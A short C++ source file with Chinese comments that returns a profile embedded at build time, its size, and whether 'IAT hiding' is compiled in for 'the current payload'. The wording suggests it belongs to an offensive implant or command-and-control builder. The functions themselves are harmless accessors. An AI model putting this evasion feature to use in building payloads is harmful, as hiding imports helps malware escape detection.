// 文件作用：编译期 profile 访问器：把构建时写入的 PROFILE/PROFILE_SIZE 暴露给 C++ 代码读取。
// getProfile 返回构建时嵌入到二进制里的 profile 字节串。
char* getProfile()
{
	return (char*) PROFILE;
}

// getProfileSize 返回嵌入 profile 的大小。
unsigned int getProfileSize()
{
	return PROFILE_SIZE;
}

// isIatHidingEnabled 告诉运行时代码当前 payload 是否启用了 IAT hiding。
int isIatHidingEnabled()
{
#if defined(IAT_HIDING)
	return 1;
#else
	return 0;
#endif
}
